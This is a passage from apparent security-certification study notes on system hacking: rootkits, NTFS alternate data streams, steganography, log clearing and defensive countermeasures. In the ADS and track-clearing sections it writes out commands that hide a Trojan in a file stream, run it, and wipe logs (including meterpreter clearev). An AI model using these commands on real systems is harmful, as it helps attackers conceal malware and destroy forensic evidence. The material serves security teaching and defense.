New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 1 -PropertyType DWORD
```

---

## Phase 4 â€” Hiding (Evasion) ðŸ•µï¸â€â™‚ï¸

### Rootkits

Rootkits are programs that hide their presence as well as attacker's malicious activities, granting them full access to the server or host at that time and in future. They replace certain operating system calls and utilities with modified versions that undermine security of target system, causing malicious functions to be executed.

**Typical Rootkit Components:**
- Backdoor programs
- DDoS programs
- Packet sniffers
- Log-wiping utilities
- IRC bots

**How Attackers Place Rootkits:**
- Scanning for vulnerable computers and servers on the web
- Wrapping it in special packages like games
- Installing on public/corporate computers through social engineering
- Launching zero-day attacks (privilege escalation, buffer overflow, Windows kernel exploitation)

**Objectives of Rootkits:**
- Root the host system and gain remote backdoor access
- Mask attacker tracks and presence of malicious applications/processes
- Gather sensitive data, network traffic from restricted systems
- Store other malicious programs and act as server resource for bot updates

#### Types of Rootkits

- **Hypervisor Level Rootkit:** Acts as a hypervisor and modifies boot sequence to load host OS as virtual machine. Example: Blue Pill Rootkit
- **Hardware/Firmware Rootkit:** Hides in hardware devices or platform firmware which is not inspected for code integrity (EFI)
- **Kernel Level Rootkit:** Adds malicious code or replaces original OS kernel and device driver codes. Example: Bootkitâ€”very stealthy
- **Boot Loader Level Rootkit:** Replaces original boot loader with one controlled by remote attacker
- **Application Level Rootkit:** Replaces regular application binaries with fake Trojans or modifies behavior of existing applications by injecting malicious code (userland rootkits)
- **Library Level Rootkits:** Replaces original system calls with fake ones to hide information about the attacker

#### How Rootkits Work

- **Spyware Integration:** Modifies software programs to infect them with spyware. Sometimes difficult to detect, but strange behaviors may be noticed
- **Back Door:** Modification built into software not part of original design. Creates hidden feature so intruder can use software for malicious purposes undetected
- **Byte Patching:** Bytes are constructed in specific order which can be modified. Rearranging bytes compromises computer software protections
- **Source-Code Modification:** Modifying code in PC's software at main source. Intruder inserts malicious lines of source code for hacking software with confidential information

#### Detecting Rootkits

**Detection Methods:**
- **Integrity-Based Detection:** Compares snapshot of file system, boot records, or memory with known trusted baseline
- **Signature-Based Detection:** Compares characteristics of all system processes and executable files with database of known rootkit fingerprints
- **Heuristic/Behavior-Based Detection:** Any deviations in system's normal activity or behavior may indicate presence of rootkit
- **Runtime Execution Path Profiling:** Compares runtime execution paths of system processes and executable files before and after rootkit infection
- **Cross View-Based Detection:** Enumerates key elements (system files, processes, registry keys) and compares them to algorithm that generates similar data set without relying on common APIs. Discrepancies indicate rootkit presence

**Detection Steps:**
1. Run `dir /s /b /ah` and `dir /s /b /a-h` inside potentially infected OS and save results
2. Boot into clean CD, run same commands on same drive and save results
3. Run clean version of WinDiff on two sets of results to detect file-hiding ghostware (invisible inside but visible from outside)
4. **Note:** Will have false positives. Doesn't detect stealth software hiding in BIOS, video card EEPROM, bad disk sectors, Alternate Data Streams, etc.

**Detection Tools:**
- `rkhunter`, `chkrootkit` (Linux)
- `AIDE`, `Tripwire` (integrity checking)
- Cross-view tools (compare OS APIs output vs raw disk/volume analysis using `sleuthkit`/`fls`)
- Stinger (scans rootkits, running processes, loaded modules)
- UnHackMe (detects and removes rootkits/malware/adware/spyware/Trojans)
- GMER (detects and removes rootkits)

### NTFS Alternate Data Streams (ADS)

NTFS Alternate Data Stream is a Windows hidden stream which contains metadata for files such as attributes, word count, author name, and access/modification time. It is the ability to fork data into existing files without changing or altering their functionality, size, or display to file browsing utilities.

**Attack Vector:**
- ADS allows attacker to inject malicious code in files on accessible system
- Execute hidden code without being detected by the user
- The additional streams are not visible in normal file listings

**NTFS Stream Manipulation Commands:**

To move contents of Trojan.exe to Readme.txt (stream):
```
C:\>type c:\Trojan.exe > c:\Readme.txt:Trojan.exe
```

To create a link to the Trojan.exe stream inside Readme.txt file:
```
C:\>mklink backdoor.exe Readme.txt:Trojan.exe
```

To execute the Trojan.exe inside Readme.txt (stream):
```
C:\>backdoor
```

**Detection/Examples:** 
- PowerShell: `Get-Item -Path 'C:\path\file.txt' -Stream * -Force`
- Sysinternals: `streams.exe -s C:\path`
- Use `dir /r` to list alternate data streams in Windows

**Countermeasures:**
- Delete NTFS streams by moving suspected files to FAT partition (FAT doesn't support ADS)
- Use third-party file integrity checkers like Tripwire to maintain integrity of NTFS partition files
- Use detection programs: LADS, ADSSpy, StreamArmor
- StreamArmor discovers hidden Alternate Data Streams and cleans them completely from system

### Steganography

Steganography is a technique of hiding a secret message within an ordinary message and extracting it at the destination to maintain confidentiality of data. Utilizing a graphic image as cover is the most popular method to conceal data in files.

**Use Cases:**
- Attackers use steganography to hide messages such as:
  - List of compromised servers
  - Source code for hacking tools
  - Plans for future attacks
  - Command and control communications

#### Classification of Steganography

**1. Technical Steganography**
**2. Linguistic Steganography:**
   - **Semagrams:**
     - Visual Semagram
     - Text Semagrams
   - **Open Codes:**
     - Covered Ciphers:
       - Null Cipher
       - Grille Cipher
       - Jargon Code

#### Types Based on Cover Medium

- **Image Steganography:** Most common method
- **Document Steganography:** Hiding data in documents
- **Folder Steganography:** Hidden data in folder structures
- **Video Steganography:** Hiding in video files
- **Audio Steganography:** Hiding in audio files
- **White Space Steganography:** Hides message in ASCII text by adding white spaces to end of lines
- **Spam/Email Steganography:** Hiding data in spam or email headers/content
- **Web Steganography:** Embedding data in web pages
- **DVD-ROM Steganography:** Hiding data in DVD structures
- **Natural Text Steganography:** Converting sensitive information into user-definable free speech (like a play)
- **Hidden OS Steganography:** Hiding one operating system inside another
- **C++ Source Code Steganography:** Hiding tools in source code files

#### Image Steganography Techniques

Information is hidden in image files of different formats (.PNG, .JPG, .BMP, etc.). Image steganography tools replace redundant bits of image data with the message in such a way that effect cannot be detected by human eyes.

**1. Least Significant Bit (LSB) Insertion:**
- The rightmost bit of a pixel is called the Least Significant Bit
- Binary data of message is broken and inserted into LSB of each pixel in deterministic sequence
- Modifying LSB doesn't result in noticeable difference (net change is minimal and indiscernible to human eye)
- **Example:** Given string of bytes:
  ```
  (00100111 11101001 11001000) (00100111 11001000 11101001) (11001000 00100111 11101001)
  ```
  To hide letter "H" (binary: 01001000), stream becomes:
  ```
  (00100110 11101001 11001000) (00100110 11001001 11101000) (11001000 00100110 11101001)
  ```
  To retrieve "H", combine all LSB bits: 01001000

**2. Masking and Filtering:**
- Generally used on 24-bit and grayscale images
- Hides data using method similar to watermarks on paper
- Done by modifying luminance of parts of image
- Can be detected with simple statistical analysis but resistant to lossy compression and image cropping
- Information not hidden in noise but in significant areas of image

**3. Algorithms and Transformation:**
- Hides data in mathematical functions used in compression algorithms
- Data embedded by changing coefficients of transform of image
- JPEG images use Discrete Cosine Transform (DCT)
- **Transformation techniques:**
  - Fast Fourier Transformation
  - Discrete Cosine Transformation
  - Wavelet Transformation

#### Audio Steganography

Refers to hiding secret information in audio files (.MP3, .RM, .WAV, etc.)
- Information can be hidden using LSB method
- Can use frequencies inaudible to human ear (>20,000 Hz)
- **Methods:**
  - Echo data hiding
  - Spread spectrum method
  - LSB coding
  - Tone insertion
  - Phase encoding

#### Video Steganography

Refers to hiding secret information into carrier video file (.AVI, .MPG4, .WMV, etc.)
- Discrete Cosine Transform (DCT) manipulation used to add secret data during transformation process
- Uses techniques from both audio and image steganography
- Large number of secret messages can be hidden as every frame consists of images and sound

#### Steganalysis

Steganalysis is the art of discovering and rendering covert messages using steganography.

**Challenges:**
- Suspect information stream may or may not have encoded hidden data
- Efficient and accurate detection of hidden content within digital images is difficult
- Message might have been encrypted before inserting into file or signal
- Some suspect signals/files may have irrelevant data or noise encoded

**Steganalysis Methods/Attacks:**
- **Stego-only:** Only stego object available for analysis
- **Known-stego:** Attacker has access to stego algorithm, cover medium, and stego-object
- **Known-message:** Attacker has access to hidden message and stego object
- **Known-cover:** Attacker compares stego-object and cover medium to identify hidden message
- **Chosen-message:** Generates stego objects from known message using specific steganography tools to identify algorithms
- **Chosen-stego:** Attacker has access to stego-object and stego algorithm

**Detection Methods:**

*Text File Detection:*
- Alterations made to character positions for hiding data
- Look for text patterns or disturbances, unusual language, and unusual blank spaces

*Image File Detection:*
- Determine changes in size, file format, last modified timestamp, and color palette
- Use statistical analysis methods for image scanning

*Audio File Detection:*
- Statistical analysis for LSB modifications
- Scan in-audio frequencies for hidden information
- Look for odd distortions and patterns showing existence of secret data

*Video File Detection:*
- Combination of methods used in image and audio files

**Tools:** `steghide`, `stegsolve`, `OpenStego`, `Stegdetect` (use in authorized labs)

---

## Phase 5 â€” Clearing Tracks ðŸ§¹

Once intruders have successfully gained administrator access on a system, they will try to cover their tracks to avoid detection.

### Common Clearing Track Activities

#### Disabling Auditing
- Disable audit policies to prevent new events from being recorded
- Modify audit settings to reduce logging verbosity
- Turn off specific event categories

#### Clearing Logs

**Windows Log Clearing:**
- Navigate to: Start > Control Panel > System and Security > Administrative Tools > Event Viewer
- Delete all log entries logged while compromising the system
- Target logs: Application, Security, System, Setup, Forwarded Events
- **Detection Alert:** Windows Event ID 1102 indicates "Audit log cleared" â€” high priority alert for defenders

**Linux Log Clearing:**
- Navigate to `/var/log` directory on Linux system
- Open plain text file containing log messages with text editor: `/var/log/messages`
- Delete all log entries logged while compromising system
- Target files: `wtmp`, `btmp`, `lastlog`, `auth.log`, `syslog`
- Advanced: Use `journalctl --rotate && journalctl --vacuum-time=1s` on systemd systems

**Metasploit Log Clearing:**
If system is exploited with Metasploit, attacker uses meterpreter shell to wipe out all logs:
```
meterpreter> clearev
```

#### Manipulating Logs
- Modify log entries instead of deleting all logs (less suspicious)
- Insert false entries to mislead investigators
- Change timestamps to create false timeline

### Clearing Online Tracks

**Ways to Clear Online Tracks:**
- Remove Most Recently Used (MRU) lists
- Delete cookies
- Clear cache
- Turn off AutoComplete
- Clear Toolbar data from browsers

**Windows 8.1/10 Privacy Settings:**
- Click Start button > Control Panel > Appearance and Personalization > Taskbar and Start Menu
- Click Start Menu tab
- Under Privacy, clear "Store and display recently opened items in the Start menu and taskbar" checkbox

**Registry Cleaning (Windows 8.1/10):**
- Navigate to: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer`
- Remove key for "Recent Docs"
- Delete all values except "(Default)"

### Covering Tracks Tools

**CCleaner:**
- System optimization and cleaning tool
- Cleans traces of temporary files, log files, registry files, memory dumps
- Removes online activities: Internet history, cookies, cached data
- Cleans application data and MRU lists

**MRU-Blaster:**
- Application for Windows that cleans Most Recently Used lists stored on computer
- Allows cleaning of temporary Internet files and cookies
- Removes traces of recent document access

**Other Tools:**
- **BleachBit** (Linux/Windows)
- **Privacy Eraser**
- **Meterpreter** (clearev command)

### Detection Points for Defenders

- **Windows Event ID 1102:** Audit log cleared â€” high priority alert
- **Sudden log truncation:** Missing or zeroed log files
- **Linux indicators:**
  - Sudden truncation or missing `wtmp`/`btmp` entries
  - Unexpected time changes in log files
  - Gaps in auditd logs
  - Modified file timestamps on log files
- **Behavioral indicators:**
  - Unusual system activity before logs stop
  - Administrative tools run with elevated privileges
  - Suspicious process execution patterns
  - Network connections to unusual destinations

---

## Countermeasures & Hardening ðŸ›¡ï¸

### Password Security Countermeasures

#### Secure Password Rules

**Password Requirements:**
- Must be at least 8 characters long (12 recommended minimum)
- Must contain at least:
  - One uppercase letter [A-Z]
  - One lowercase letter [a-z]
  - One numeric character [0-9]
  - One special character from set: ! @ $ % ^ & * ( ) - = + [ ] ; : ' " , < > / ?
- Must NOT contain:
  - Login ID, email address, first name, or last name
  - Repeating character strings of 3+ identical characters (e.g., '1111' or 'aaa')

#### Password Management Best Practices

- **Use salted, slow hash functions:** bcrypt, argon2, PBKDF2 where possible
- **Do not reuse passwords:** Use different password during password change
- **Never share passwords:** Each user should have unique credentials
- **Avoid dictionary words:** Do not use passwords found in dictionary
- **Avoid personal information:** Never use date of birth, spouse/child/pet names
- **Avoid cleartext protocols:** Do not use protocols with weak encryption
- **Password change policy:** Set password change policy to 30 days for high-risk accounts
- **Secure storage:** Avoid storing passwords in unsecured locations
- **Never use default passwords:** Change all system defaults immediately
- **Use random salt:** Use random string (salt) as prefix or suffix with password before encrypting

#### Technical Controls

- **Enable information security audit:** Monitor and track password attacks
- **Application security:** Ensure applications neither store passwords to memory nor write them to disk in clear text
- **Enable SYSKEY:** Use strong password to encrypt and protect SAM database
- **Monitor brute force attempts:** Monitor server logs for brute force attacks on user accounts
- **Account lockout:** Lock out account subjected to too many incorrect password guesses
- **Failed login tracking:** Implement progressive delays after failed attempts

### Privilege Escalation Countermeasures

- **Restrict interactive logon privileges:** Limit who can log in interactively
- **Use encryption:** Encrypt sensitive data at rest and in transit
- **Least privilege principle:** Run users and applications with minimum required privileges
- **Reduce privileged code:** Minimize amount of code running with particular privilege
- **Multi-factor authentication:** Implement MFA and robust authorization mechanisms
- **Perform debugging:** Use bounds checkers and stress tests during development
- **Run services unprivileged:** Configure services to run as unprivileged accounts
- **Thorough testing:** Test OS and application coding errors and bugs thoroughly
- **Privilege separation:** Implement methodology to limit scope of programming errors and bugs
- **Use least privilege for service accounts:** Restrict service account privileges to minimum required
- **Operational security:** Use jump boxes and MFA for privileged accounts; restrict interactive logons via Group Policy

### Keylogger Countermeasures

#### General Protection

- **Use pop-up blocker:** Install and configure pop-up blocking
- **Anti-malware software:** Install anti-spyware/antivirus programs and keep signatures up to date
- **Professional firewall:** Install good professional firewall software
- **Anti-keylogging software:** Use specialized anti-keylogging tools
- **Recognize phishing:** Identify and delete phishing emails immediately
- **Strong unique passwords:** Choose new passwords for different accounts and change frequently
- **Avoid junk email:** Do not open junk emails
- **Do not click suspicious links:** Avoid links in unwanted or doubtful emails
- **Keystroke interference:** Use software that inserts randomized characters into every keystroke

#### Advanced Protection

- **Scan before installing:** Scan files before installing on computer
- **Regular monitoring:** Use registry editor or process explorer to check for keystroke loggers
- **Physical security:** Keep hardware in locked environment; frequently check keyboard cables for attached connectors
- **Windows on-screen keyboard:** Use for entering confidential information
- **Host-based IDS:** Install system that monitors and can disable keylogger installation
- **Automatic form-filling:** Use programs or virtual keyboards for sensitive data entry
- **Regular system scanning:** Use software that frequently scans and monitors system/network changes

#### Hardware Keylogger Countermeasures

- **Restrict physical access:** Control access to sensitive computer systems
- **Periodic inspection:** Regularly check all computers for connected hardware devices
- **Keyboard encryption:** Use encryption between keyboard and its driver
- **Detection tools:** Use anti-keylogger detecting hardware presence (e.g., Oxynger KeyShield)

### Spyware Countermeasures

#### Preventive Measures

- **Avoid untrusted systems:** Try to avoid using computers not totally under your control
- **Browser security settings:** Adjust to medium or higher for Internet zone
- **Be cautious:** Suspicious emails and sites should be avoided
- **Regular updates:** Update software regularly and use firewall with outbound protection
- **Regular monitoring:** Check task manager and MS configuration manager reports regularly
- **Virus definition updates:** Update and scan system for spyware regularly
- **Anti-spyware software:** Install and use dedicated anti-spyware software
- **Safe web surfing:** Perform web surfing safely and download cautiously

#### Best Practices

- **Avoid administrative mode:** Do not use unless necessary
- **Avoid public terminals:** For banking and sensitive activities
- **Do not download risky content:** Avoid free music files, screensavers, smiley faces from Internet
- **Beware of pop-ups:** Never click anywhere on pop-up windows or web pages
- **Read disclosures:** Carefully read all disclosures, including license agreement and privacy statement before installing
- **Do not store personal information:** On computers not totally under your control

### Rootkit Countermeasures

#### Prevention

- **Reinstall from trusted source:** Reinstall OS/applications after backing up critical data
- **Documented procedures:** Keep well-documented automated installation procedures
- **Harden systems:** Implement hardening procedures on workstations and servers
- **User education:** Educate staff not to download files/programs from untrusted sources
- **Network protection:** Install network and host-based firewalls
- **Trusted restoration media:** Ensure availability for recovery
- **Update and patch:** Keep OS and applications updated

#### Detection and Response

- **Kernel memory dump analysis:** Perform analysis to determine rootkit presence
- **File integrity verification:** Verify integrity of system files regularly using cryptographically strong digital fingerprint technologies
- **Update security software:** Keep antivirus and anti-spyware software current
- **Avoid admin privileges:** Do not log in with administrative privileges unless necessary
- **Least privilege principle:** Adhere to principle strictly
- **Rootkit protection:** Ensure chosen antivirus software has rootkit protection
- **Minimize attack surface:** Do not install unnecessary applications; disable unused features and services

#### Anti-Rootkit Tools

- **Stinger:** Scans rootkits, running processes, loaded modules, registry and directory locations used by malware
- **UnHackMe:** Detects and removes rootkits/malware/adware/spyware/Trojans
- **GMER:** Application that detects and removes rootkits
- **rkhunter:** Linux rootkit scanner
- **chkrootkit:** Linux rootkit detection tool
- **AIDE/Tripwire:** File integrity checking

### NTFS Streams Countermeasures

- **Delete streams:** Move suspected files to FAT partition (ADS not supported on FAT)
- **File integrity checker:** Use third-party tools like Tripwire to maintain integrity of NTFS partition files
- **Detection programs:** Use LADS, ADSSpy to detect streams
- **StreamArmor:** Discovers hidden Alternate Data Streams and cleans them completely from system
- **PowerShell monitoring:** Use `Get-Item` with `-Stream` parameter to enumerate streams
- **Regular scanning:** Implement regular ADS scanning in security audits

### Network Hygiene

- **Disable LLMNR/NBT-NS:** Via Group Policy to prevent poisoning attacks
- **Use DNS only:** Enforce proper DNS configuration
- **Network segmentation:** Limit lateral movement and broadcast domains
- **Monitor unusual responders:** Detect rogue responders on network

### Logging & Detection

- **Centralize logs:** Send to immutable SIEM with retention and alerting
- **Monitor critical events:** Watch for cleared logs, service changes, audit policy modifications
- **Implement alerting:** Set up alerts for Event ID 1102 and other suspicious activities
- **Log retention:** Maintain appropriate log retention periods
- **Integrity monitoring:** Use tools like AIDE, Tripwire for file integrity
- **Regular scanning:** Run rkhunter, chkrootkit periodically
- **Audit unexpected changes:** Monitor for SUIDs or writable system binaries

### Kerberos Hardening

- **Enable AES encryption:** Drop RC4 support where possible
- **Long unique passwords:** Ensure service account passwords are long and unique
- **Limit service account privileges:** Use least privilege for SPNs
- **Monitor Kerberos requests:** Watch for suspicious SPN requests or abnormal Kerberos traffic
- **Implement monitoring:** Detect unusual TGS requests that could indicate Kerberoasting

---

## System Hacking Summary & Best Practices ðŸ“‹

### Key Takeaways

**1. System Hacking is Methodical**
- Follows structured phases: Access â†’ Escalation â†’ Execution â†’ Hiding â†’ Covering Tracks
- Each phase builds upon previous success
- Requires patience, planning, and operational security

**2. Multiple Attack Vectors Exist**
- Password attacks (online, offline, rainbow tables)
- Exploitation of vulnerabilities
- Social engineering and physical access
- Credential theft and reuse

**3. Persistence is Critical**
- Attackers establish multiple persistence mechanisms
- Registry keys, scheduled tasks, services most common
- Redundancy ensures continued access

**4. Defense Requires Layers**
- No single control prevents all attacks
- Defense in depth strategy essential
- Detection and response as important as prevention

### Attack Lifecycle Review

**Initial Compromise:**
- Weakest link often exploited first
- Credentials most common entry point
- Social engineering highly effective

**Privilege Escalation:**
- Local exploits target kernel vulnerabilities
- Credential harvesting enables lateral movement
- Misconfigurations provide easy escalation

**Maintaining Access:**
- Multiple persistence methods deployed
- Backdoors and RATs provide remote control
- Living off the land avoids detection

**Covering Tracks:**
- Log manipulation essential for stealth
- Rootkits hide presence
- Anti-forensics techniques employed

### Defensive Strategy

#### Prevention Controls

**1. Identity and Access Management**
- Enforce strong password policies (length > complexity)
- Implement multi-factor authentication (MFA)
- Use least privilege principle
- Regularly rotate credentials
- Disable unnecessary accounts

**2. System Hardening**
- Keep systems patched and updated
- Disable unnecessary services and features
- Remove unused software and accounts
- Configure secure baselines
- Implement application whitelisting

**3. Network Security**
- Network segmentation and VLANs
- Implement zero-trust architecture
- Deploy next-generation firewalls
- Use encrypted protocols (TLS, SSH)
- Disable legacy protocols (SMBv1, NTLM where possible)

**4. Endpoint Protection**
- Deploy EDR (Endpoint Detection and Response)
- Enable antivirus and anti-malware
- Implement host-based firewalls
- Use disk encryption
- Configure secure boot and UEFI settings

#### Detection Controls

**1. Logging and Monitoring**
- Centralize logs to SIEM
- Enable detailed audit logging:
  - Authentication events (Event ID 4624, 4625, 4648)
  - Privilege use (Event ID 4672)
  - Process creation (Event ID 4688)
  - PowerShell logging (Event ID 4103, 4104)
  - Scheduled task creation (Event ID 4698)
  - Service installation (Event ID 7045)
- Implement log retention policies
- Protect log integrity

**2. Behavioral Analytics**
- User and Entity Behavior Analytics (UEBA)
- Anomaly detection systems
- Baseline normal behavior
- Alert on deviations

**3. Threat Hunting**
- Proactive searching for indicators of compromise
- Hunt for persistence mechanisms
- Check for suspicious processes and connections
- Verify file integrity

**4. Indicators to Monitor**

**Authentication Anomalies:**
- Failed login attempts (brute force)
- Logins at unusual times
- Access from unusual locations
- Privilege escalation events
- Account creation or modification

**Process Anomalies:**
- Unusual parent-child relationships
- PowerShell execution from Office applications
- cmd.exe spawned by unusual processes
- Living off the land binary abuse
- Process injection indicators

**Network Anomalies:**
- Unusual outbound connections
- Command and control beacon patterns
- DNS tunneling
- Large data transfers
- Connections to suspicious IPs/domains

**File System Anomalies:**
- New files in system directories
- Modified system binaries
- Alternate Data Streams
- Suspicious scheduled tasks
- Registry modifications

#### Response Procedures

**Incident Response Phases:**

**1. Preparation**
- Develop incident response plan
- Establish response team
- Deploy necessary tools
- Create communication channels

**2. Identification**
- Detect and verify incident
- Determine scope and severity
- Identify affected systems
- Collect initial evidence

**3. Containment**
- Isolate affected systems
- Prevent lateral movement
- Preserve evidence
- Implement temporary fixes

**4. Eradication**
- Remove malware and backdoors
- Close vulnerabilities
- Reset compromised credentials
- Patch systems

**5. Recovery**
- Restore from clean backups
- Rebuild compromised systems
- Implement monitoring
- Verify security controls

**6. Lessons Learned**
- Conduct post-incident review
- Update procedures
- Improve defenses
- Share threat intelligence

### Forensic Considerations

**Evidence Collection:**
- Memory dumps (volatile data)
- Disk images (non-volatile data)
- Network captures
- Log files
- Timeline analysis

**Chain of Custody:**
- Document all evidence handling
- Hash files to prove integrity
- Maintain detailed notes
- Follow legal procedures

**Analysis Tools:**
- Volatility (memory forensics)
- Autopsy / Sleuth Kit (disk forensics)
- Wireshark (network forensics)
- Log analysis tools (Splunk, ELK)
- Timeline tools (Plaso, log2timeline)

### Compliance and Frameworks

**Security Frameworks:**
- NIST Cybersecurity Framework
- CIS Controls
- MITRE ATT&CK
- ISO 27001/27002

**Compliance Requirements:**
- PCI DSS (payment card data)
- HIPAA (healthcare)
- GDPR (privacy)
- SOX (financial)

### Continuous Improvement

**1. Regular Assessments**
- Vulnerability scanning
- Penetration testing
- Red team exercises
- Purple team collaboration

**2. Security Awareness**
- User training programs
- Phishing simulations
- Security culture development
- Incident reporting procedures

**3. Threat Intelligence**
- Subscribe to threat feeds
- Participate in ISACs
- Monitor attacker TTPs
- Update defenses accordingly

**4. Technology Updates**
- Evaluate new security tools
- Implement emerging technologies
- Automate where possible
- Stay current with patches

### Red Team vs Blue Team Perspectives

**Red Team (Attackers):**
- Exploit weakest link
- Maintain operational security
- Establish redundant access
- Blend in with normal activity
- Achieve objectives stealthily

**Blue Team (Defenders):**
- Assume breach mentality
- Defense in depth
- Hunt proactively
- Respond rapidly
- Learn and adapt

**Purple Team (Collaboration):**
- Share techniques and findings
- Improve both offensive and defensive capabilities
- Validate security controls
- Bridge communication gap

### Emerging Trends

**1. Cloud Security**
- Container and Kubernetes attacks
- Cloud misconfigurations
- Identity and access management challenges
- Multi-cloud complexity

**2. Advanced Persistent Threats (APTs)**
- Nation-state actors
- Long-term campaigns
- Custom malware and tooling
- Supply chain attacks

**3. Ransomware Evolution**
- Double extortion (encrypt + exfiltrate)
- Ransomware-as-a-Service (RaaS)
- Targeted attacks on critical infrastructure
- Payment in cryptocurrency

**4. AI and Machine Learning**
- Automated vulnerability discovery
- Adversarial machine learning
- Deepfakes and social engineering
- AI-powered defense systems

### Final Recommendations

**For Organizations:**
1. Implement comprehensive security program
2. Regular training and awareness
3. Continuous monitoring and improvement
4. Incident response readiness
5. Cyber insurance consideration

**For Security Professionals:**
1. Stay updated on latest threats and techniques
2. Practice in safe, legal environments
3. Obtain relevant certifications (CEH, OSCP, GPEN)
4. Contribute to security community
5. Maintain ethical standards

**For System Administrators:**
1. Follow principle of least privilege
2. Patch management discipline
3. Monitor and audit regularly
4. Backup and recovery procedures
5. Incident response coordination

### Ethical and Legal Considerations

**Legal Requirements:**
- Obtain explicit written authorization
- Define scope clearly
- Respect privacy and data protection laws
- Report vulnerabilities responsibly
- Maintain confidentiality

**Ethical Principles:**
- Do no harm
- Respect user privacy
- Act with integrity
- Maintain professional standards
- Use knowledge responsibly

**Authorized Testing Only:**
- Controlled lab environments
- Capture the Flag (CTF) competitions
- Bug bounty programs with clear rules
- Penetration testing with contracts
- Security research with ethics approval

---

> **Note:** All offensive commands, demonstrations, and tools referenced here are for **authorized lab use only**. Never run them against systems you do not own or are not explicitly permitted to test.

---

*Notes expanded and clarified from Module 8 (System Hacking) on 2026-01-30.*